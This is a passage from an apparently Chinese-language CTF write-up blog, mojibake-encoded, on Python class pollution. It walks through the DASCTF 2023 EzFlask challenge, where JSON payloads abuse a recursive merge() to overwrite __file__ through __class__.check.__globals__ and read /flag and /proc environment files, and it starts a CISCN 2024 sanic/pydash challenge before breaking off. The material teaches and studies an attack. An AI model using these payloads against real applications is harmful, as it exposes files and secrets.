class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = payload[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    set_(pollute,key,value)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Finished pollute &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>â€‹ä¸çŸ¥ä¸ºä½•ï¼Œè¿™é‡Œå†™çš„ Web æœåŠ¡ä¸­ï¼ŒPollution () è¿™é‡Œä¼ å…¥ reqeust å‚æ•°æ€»æ˜¯ä¼šå‡ºé”™ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨è¿™ç§æ–¹å¼ç›´æ¥è§„å®šäº† key å’Œ value çš„å€¼ï¼Œä½œä¸ºä¸€ç§è¾“å…¥æ–¹å¼ã€‚</p><p>â€‹é¦–å…ˆç¬¬ä¸€æ¬¡è®¿é—®æ ¹è·¯ç”±ï¼Œå¾—åˆ°çš„é¡µé¢å¦‚ä¸‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/188c10d495a342d4927f7d8a8b841d58.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åï¼Œå°è¯•è®¿é—®ä¸‹ /pollute è·¯ç”±ï¼Œè¿”å›äº†ä¸€ä¸ª Finished pollute ï¼Œéšåå†å»è®¿é—®ä¸‹æ ¹è·¯ç”±ï¼Œå¾—åˆ°çš„å¦‚ä¸‹ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/e35d4eadef714422b7670dcc405fc905.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æˆåŠŸè¯»å–åˆ°äº†æˆ‘æå‰å‡†å¤‡çš„ flagã€‚</p><p>â€‹åŸå› å°±æ˜¯å› ä¸ºåœ¨__globals__é‡Œæ‰¾åˆ°äº†__file__å±æ€§ï¼Œç„¶åæ‰èƒ½è¿›è¡Œæ±¡æŸ“ã€‚</p><h2 id="dasctf-2023-0x401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›ezflask"><a class="markdownIt-Anchor" href="#dasctf-2023-0x401ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›ezflask">#</a> [DASCTF 2023 &amp; 0X401 ä¸ƒæœˆæš‘æœŸæŒ‘æˆ˜èµ›] EzFlaskï¼š</h2><p>â€‹ï¼ˆå°å£°å˜€å’•ï¼‰ï¼šå‰é¢æ‰åˆšè¯´äº†æ²¡é‡åˆ° merge çš„é¢˜ï¼Œè¿™å°±é‡åˆ°äº†ã€‚</p><p>â€‹é¦–å…ˆï¼Œæ‰“å¼€å°±æ˜¯æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç°äº†å‡ ä¸ªç‚¹ï¼Œé¦–å…ˆæ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>â€‹å°±åƒæœ€å¼€å§‹è¯´çš„é‚£æ ·ï¼Œå­˜åœ¨ merge å‡½æ•°ï¼Œç„¶åä¸‹ä¸€ä¸ªæœ‰ç”¨çš„ä¿¡æ¯æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br></pre></td></tr></table></figure><p>â€‹è¯»å–äº†å†…ç½®å±æ€§ __file__ çš„å€¼ï¼Œæœ€åä¸€ä¸ªé‡è¦çš„ä¿¡æ¯æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ï¼Œåœ¨è¯¥å‡½æ•°ä¸­è°ƒç”¨äº† merge () å‡½æ•°ï¼Œå¹¶ä¸”ï¼Œdata å¯æ§ï¼Œé‚£ä¹ˆï¼Œpayload åº”è¯¥å°±æ˜¾è€Œæ˜“è§äº†ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span>#å½“flagåœ¨æ ¹ç›®å½•ä¸‹ä»¥åŠflagæ–‡ä»¶åçŸ¥é“çš„æƒ…å†µä¸‹</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/283dc0e8e2fa4c809e8dd7356a9cfe04.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä½†æ˜¯ï¼Œä¸Šä¼ å´å¤±è´¥äº†ï¼Ÿï¼ˆè¿™å„¿å¯èƒ½ä¼šå‡ºç°ä¸¤ä¸ªé—®é¢˜ï¼Œé™¤äº†é»‘åå•æœ¬èº«çš„é—®é¢˜å¤–ï¼Œè¿˜æœ‰ä¸ªé‡ç‚¹é—®é¢˜ï¼Œä¹Ÿä¼šå¯¼è‡´å¤±è´¥ï¼Œå°±æ˜¯ä¸€å®šè¦æŠŠ Content-Type ä¿®æ”¹ä¸º<strong> application/json</strong>ï¼‰çœ‹çœ‹è¿™å„¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br></pre></td></tr></table></figure><p>â€‹è™½ç„¶æŒºæ˜æ˜¾çš„ï¼Œä½†è¿˜æ˜¯å¾ˆé˜´ã€‚å¾ˆæ˜¾ç„¶ï¼Œåœ¨ check å‡½æ•°ä¸‹ï¼Œæœ‰ä¸ªä¸é»‘åå•çš„æ¯”è¾ƒï¼Œæ¨æµ‹åº”è¯¥æ˜¯è¿™å„¿è¿‡ä¸äº†ï¼Œä¸è¿‡ï¼Œå½“æˆ‘ä»¬ä¾æ¬¡æŠŠé‚£å‡ ä¸ªå˜é‡ä¿®æ”¹ä¸€ä¸‹ä¹‹åï¼Œå‘ç°ï¼Œå½“ <code>__init__</code> è¢«ä¿®æ”¹æˆ <code>__int__</code> åï¼Œè¿”å›çš„æ˜¯ Register Successï¼Œæ‰€ä»¥ï¼Œè¿™é‡Œä¼¼ä¹åªéœ€è¦ç»•è¿‡ <code>__init__</code> å°±è¡Œäº†ï¼Œå…ˆåšå¦‚ä¸‹æµ‹è¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(a.__class__.check.__globals__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x00000122A3EB56D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;D:\\html study\\PyCharm Project\\flask_pydash1\\test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;A&#x27;: &lt;class &#x27;__main__.A&#x27;&gt;, &#x27;a&#x27;: &lt;__main__.A object at 0x00000122A405FA50&gt;&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹å‘ç°æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è±¡çš„æ–¹æ³•æ¥è·å– <code>__globals__</code> å…¨å±€å˜é‡ï¼Œæ‰€ä»¥ payload å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__class__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;check&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;__file__&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/flag&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹ä½†æ˜¯æœ€åè¯»å–æ ¹è·¯ç”±çš„æ—¶å€™å‡ºç°äº†å“¥é—®é¢˜ï¼Œé‚£å°±æ˜¯ï¼Œflag æ–‡ä»¶åä¸å¯¹ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/f39a01d5d0ed4bbaac39251c83970cdc.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä»¤äººçª’æ¯çš„æ“ä½œã€‚ä¸è¿‡æœ‰ä¸€ç‚¹å„¿æˆ–è®¸æœ‰ç‚¹å„¿å¸Œæœ›ï¼Œé‚£å°±æ˜¯ç¯å¢ƒå˜é‡ï¼Œå¦‚æœç¯å¢ƒå˜é‡é‡Œé¢ä¹Ÿæ²¡æœ‰çš„è¯ï¼Œé‚£æˆ‘å¯å°±çœŸæ²¡æ³•äº†ï¼Œè¯´å¹²å°±å¹²ï¼Œé¦–å…ˆï¼Œç¯å¢ƒå˜é‡å¯ä»¥é€šè¿‡  <code>/proc/$PID/environ</code>  æ¥è¯»å–ï¼Œè¿™é‡Œæ¨æµ‹æœ‰å¯èƒ½éœ€è¦ç”¨åˆ°çˆ†ç ´ã€‚</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d2180dbf885469a822d061ec3e4c913.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä¹‹åè¯»å–æ ¹è·¯ç”±ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/dfd34f6d7e2f4a6bbdbbe3c0491905c5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿æ°”å¥½ï¼Œflag åˆšå¥½å°±åœ¨ç¯å¢ƒå˜é‡é‡Œã€‚flag å¦‚ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1084bd02-8273-4a0b-a490-08451805df3a&#125;</span><br></pre></td></tr></table></figure><h2 id="ciscn2024-åˆèµ›-sanic"><a class="markdownIt-Anchor" href="#ciscn2024-åˆèµ›-sanic">#</a> [Ciscn2024 åˆèµ›] sanic</h2><p>â€‹æ ¹è·¯ç”±æç¤ºï¼š where is my flag?ï¼Œf12 åå‘ç°æç¤ºäº† /src è·¯ç”±ï¼Œè®¿é—®åè·å¾—æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span 